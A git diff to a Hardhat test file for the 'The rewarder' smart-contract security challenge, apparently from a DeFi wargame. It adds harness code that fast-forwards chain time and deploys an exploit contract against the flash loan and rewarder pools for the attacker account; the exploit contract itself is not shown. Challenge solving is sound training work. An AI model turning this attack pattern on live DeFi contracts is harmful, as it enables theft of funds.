@@ -66,6 +66,14 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        const RewarderExploitFactory = await ethers.getContractFactory('RewarderExploitDeployer', attacker);
+        await ethers.provider.send("evm_increaseTime",[5*24*60*61]) 
+        console.log("Starting exploit")
+        const exploit = await RewarderExploitFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, attacker.address)
+        //const res = await exploit.attack();
+        console.log("Challenge complete")  
+        
     });
 
     after(async function () {
@@ -88,6 +96,7 @@ describe('[Challenge] The rewarder', function () {
         
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
+        
         let rewards = await this.rewardToken.balanceOf(attacker.address);
 
         // The amount of rewards earned should be really close to 100 tokens
